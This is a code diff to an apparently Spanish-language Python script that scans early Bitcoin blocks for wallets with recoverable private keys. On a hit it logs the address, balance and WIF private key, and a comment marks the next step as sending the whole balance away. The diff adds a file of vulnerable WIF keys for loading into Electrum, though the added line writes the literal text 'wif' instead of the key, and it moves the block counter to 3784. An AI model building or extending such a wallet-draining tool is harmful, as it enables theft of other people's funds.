@@ -336,6 +336,10 @@ def procesar_bloque_y_transacciones(bloque_id):
                     print(f"[WIN!] Dirección: {direccion}, Balance: {balance} BTC, WIF: {wif} :: Total Balance: {totalBalance}")
 
                     guardar_texto_en_archivo(f"Dirección: {direccion}, Balance: {balance} BTC, WIF: {wif} :: Total Balance: {totalBalance}", "walletconBalance.txt")
+
+                    # Crear Archivo para Subir a Electrum y asi monitorear mejor
+                    guardar_texto_en_archivo(f"wif", "WalletsVulnerablesWIFElectrum.txt")
+
                     
                     if balance > 0:
                         # Enviar todo el balance
@@ -370,7 +374,7 @@ def contador_infinito(inicio, archivo="avanceBlock.txt"):
 
 
 # nos quedamos en 3784
-for i in contador_infinito(16):
+for i in contador_infinito(3784):
 
     new_block_number = i # 9 de Febrero 2009
     print(f"[BlockId: {new_block_number}]")
